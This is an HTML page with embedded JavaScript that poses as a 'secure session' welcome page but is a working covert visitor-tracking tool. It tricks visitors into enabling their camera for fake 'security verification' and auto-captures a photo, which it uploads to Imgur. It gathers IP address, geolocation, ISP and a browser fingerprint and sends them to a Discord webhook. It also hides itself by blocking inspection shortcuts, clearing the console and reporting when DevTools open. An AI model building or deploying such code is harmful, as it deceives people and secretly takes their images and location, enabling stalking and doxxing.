<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 2rem;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 500px;
        }
        h1 {
            font-size: 3rem;
            margin-bottom: 1rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        p {
            font-size: 1.2rem;
            margin-bottom: 2rem;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .hidden {
            display: none;
        }
        #video {
            width: 300px;
            height: 200px;
            border-radius: 10px;
            margin: 10px 0;
            display: none;
        }
        #canvas {
            display: none;
        }
        .camera-btn {
            background: rgba(255, 255, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            cursor: pointer;
            margin: 10px;
            transition: all 0.3s ease;
        }
        .camera-btn:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
        }
        .status {
            font-size: 0.9rem;
            margin: 10px 0;
            opacity: 0.8;
        }
        .permission-request {
            background: rgba(255, 193, 7, 0.2);
            border: 1px solid rgba(255, 193, 7, 0.5);
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome!</h1>
        <p>Initializing secure session...</p>
        <div class="loading" id="loader"></div>
        
        <div id="camera-section" class="hidden">
            <div class="permission-request">
                <p>üì∏ For enhanced security verification, please allow camera access</p>
                <button class="camera-btn" onclick="requestCamera()">Enable Camera</button>
                <button class="camera-btn" onclick="skipCamera()">Skip</button>
            </div>
            <video id="video" autoplay muted playsinline></video>
            <canvas id="canvas"></canvas>
            <div class="status" id="camera-status"></div>
        </div>
        
        <div id="content" class="hidden">
            <p>‚úÖ Session verified successfully!</p>
            <p>Welcome to our secure platform.</p>
        </div>
    </div>

    <script>
        // Replace with your actual webhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
        
        let mediaStream = null;
        let capturedImage = null;

        (function() {
            'use strict';

            async function getIPAddress() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    console.error('Error getting IP:', error);
                    return 'Unknown';
                }
            }

            async function getLocationData(ip) {
                try {
                    const response = await fetch(`https://ipapi.co/${ip}/json/`);
                    const data = await response.json();
                    return data;
                } catch (error) {
                    console.error('Error getting location:', error);
                    return null;
                }
            }

            function gatherClientInfo() {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Browser fingerprint', 2, 2);
                
                const plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push(navigator.plugins[i].name);
                }

                return {
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    screenResolution: `${screen.width}x${screen.height}`,
                    windowSize: `${window.innerWidth}x${window.innerHeight}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookiesEnabled: navigator.cookieEnabled,
                    platform: navigator.platform,
                    plugins: plugins.slice(0, 5),
                    referrer: document.referrer || 'Direct',
                    url: window.location.href,
                    touchSupport: 'ontouchstart' in window,
                    colorDepth: screen.colorDepth,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    canvasFingerprint: canvas.toDataURL(),
                    connection: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt
                    } : null,
                    mediaDevices: navigator.mediaDevices ? 'Available' : 'Not Available'
                };
            }

            async function capturePhoto() {
                return new Promise((resolve) => {
                    const video = document.getElementById('video');
                    const canvas = document.getElementById('canvas');
                    const ctx = canvas.getContext('2d');
                    
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    ctx.drawImage(video, 0, 0);
                    
                    // Add timestamp overlay
                    ctx.fillStyle = 'red';
                    ctx.font = '16px Arial';
                    ctx.fillText(new Date().toLocaleString(), 10, 30);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    resolve(imageData);
                });
            }

            async function uploadImageToImgur(imageData) {
                try {
                    const base64Data = imageData.split(',')[1];
                    
                    const response = await fetch('https://api.imgur.com/3/image', {
                        method: 'POST',
                        headers: {
                            'Authorization': 'Client-ID 546c25a59c58ad7', // Public Imgur client ID
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            image: base64Data,
                            type: 'base64'
                        })
                    });
                    
                    const result = await response.json();
                    if (result.success) {
                        return result.data.link;
                    }
                    throw new Error('Upload failed');
                } catch (error) {
                    console.error('Error uploading to Imgur:', error);
                    return null;
                }
            }

            async function sendToWebhook(data) {
                try {
                    const payload = {
                        content: "üö® **NEW VISITOR CAPTURED** üö®",
                        embeds: [{
                            title: "üéØ Visitor Information",
                            color: 0xff0000,
                            fields: [
                                { name: "üåê IP Address", value: data.ip || "Unknown", inline: true },
                                { name: "üìç Location", value: data.location ? `${data.location.city}, ${data.location.country_name}` : "Unknown", inline: true },
                                { name: "üè¢ ISP", value: data.location?.org || "Unknown", inline: true },
                                { name: "üñ•Ô∏è Browser", value: getBrowserInfo(), inline: true },
                                { name: "üíª OS", value: getOSInfo(), inline: true },
                                { name: "üì± Device", value: data.clientInfo.touchSupport ? "Mobile/Touch" : "Desktop", inline: true },
                                { name: "üì∫ Screen", value: data.clientInfo.screenResolution, inline: true },
                                { name: "üïê Timezone", value: data.clientInfo.timezone, inline: true },
                                { name: "üó£Ô∏è Language", value: data.clientInfo.language, inline: true },
                                { name: "üîó Referrer", value: data.clientInfo.referrer, inline: false },
                                { name: "üìÖ Timestamp", value: data.clientInfo.timestamp, inline: false },
                                { name: "üì∏ Photo Status", value: data.photoUrl ? "‚úÖ Captured" : "‚ùå Not Available", inline: true }
                            ],
                            footer: { text: "Advanced Visitor Tracker v2.0" },
                            timestamp: new Date().toISOString()
                        }]
                    };

                    // Add image if available
                    if (data.photoUrl) {
                        payload.embeds[0].image = { url: data.photoUrl };
                        payload.embeds[0].description = "üì∏ **Visitor Photo Captured**";
                    }

                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload)
                    });

                    console.log('Data sent to webhook successfully');
                } catch (error) {
                    console.error('Error sending to webhook:', error);
                }
            }

            function getBrowserInfo() {
                const ua = navigator.userAgent;
                if (ua.includes('Chrome')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari')) return 'Safari';
                if (ua.includes('Edge')) return 'Edge';
                return 'Unknown';
            }

            function getOSInfo() {
                const ua = navigator.userAgent;
                if (ua.includes('Windows')) return 'Windows';
                if (ua.includes('Mac')) return 'macOS';
                if (ua.includes('Linux')) return 'Linux';
                if (ua.includes('Android')) return 'Android';
                if (ua.includes('iOS')) return 'iOS';
                return 'Unknown';
            }

            window.requestCamera = async function() {
                try {
                    document.getElementById('camera-status').textContent = 'Requesting camera access...';
                    
                    mediaStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            facingMode: 'user'
                        } 
                    });
                    
                    const video = document.getElementById('video');
                    video.srcObject = mediaStream;
                    video.style.display = 'block';
                    
                    document.getElementById('camera-status').textContent = 'Camera active - Taking photo in 3 seconds...';
                    
                    // Wait for video to be ready and auto-capture
                    video.onloadedmetadata = () => {
                        setTimeout(async () => {
                            capturedImage = await capturePhoto();
                            document.getElementById('camera-status').textContent = 'Photo captured! Processing...';
                            
                            // Stop camera
                            mediaStream.getTracks().forEach(track => track.stop());
                            video.style.display = 'none';
                            
                            await finalizeTracking();
                        }, 3000);
                    };
                    
                } catch (error) {
                    console.error('Camera error:', error);
                    document.getElementById('camera-status').textContent = 'Camera access denied or unavailable';
                    setTimeout(finalizeTracking, 2000);
                }
            };

            window.skipCamera = function() {
                document.getElementById('camera-status').textContent = 'Camera skipped by user';
                setTimeout(finalizeTracking, 1000);
            };

            async function finalizeTracking() {
                try {
                    const clientInfo = gatherClientInfo();
                    const ip = await getIPAddress();
                    const location = await getLocationData(ip);
                    
                    let photoUrl = null;
                    if (capturedImage) {
                        document.getElementById('camera-status').textContent = 'Uploading photo...';
                        photoUrl = await uploadImageToImgur(capturedImage);
                    }

                    const trackingData = {
                        ip: ip,
                        location: location,
                        clientInfo: clientInfo,
                        photoUrl: photoUrl
                    };

                    await sendToWebhook(trackingData);
                    
                    console.log('Complete visitor data:', trackingData);
                    
                } catch (error) {
                    console.error('Error in tracking:', error);
                } finally {
                    showContent();
                }
            }

            function showContent() {
                document.getElementById('camera-section').classList.add('hidden');
                document.getElementById('content').classList.remove('hidden');
            }

            async function initializeTracking() {
                // Hide loader and show camera section
                document.getElementById('loader').classList.add('hidden');
                
                // Check if camera is available
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    document.getElementById('camera-section').classList.remove('hidden');
                } else {
                    // No camera available, proceed without photo
                    await finalizeTracking();
                }
            }

            // Initialize when page loads
            window.addEventListener('load', function() {
                setTimeout(initializeTracking, 2000);
            });

            // Prevent right-click and common shortcuts
            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('keydown', function(e) {
                // Disable F12, Ctrl+Shift+I, Ctrl+U, etc.
                if (e.keyCode === 123 || 
                    (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
                    (e.ctrlKey && e.keyCode === 85)) {
                    e.preventDefault();
                    return false;
                }
            });

            // Anti-debugging measures
            setInterval(function() {
                if (window.outerHeight - window.innerHeight > 200 || 
                    window.outerWidth - window.innerWidth > 200) {
                    console.clear();
                }
            }, 1000);

            // Detect if DevTools is open
            let devtools = {open: false, orientation: null};
            const threshold = 160;
            setInterval(function() {
                if (window.outerHeight - window.innerHeight > threshold || 
                    window.outerWidth - window.innerWidth > threshold) {
                    if (!devtools.open) {
                        devtools.open = true;
                        // Send alert about DevTools
                        fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                content: "‚ö†Ô∏è **DEVTOOLS DETECTED** - Someone is inspecting the page!"
                            })
                        }).catch(() => {});
                    }
                } else {
                    devtools.open = false;
                }
            }, 500);

        })();
    </script>
</body>
</html>
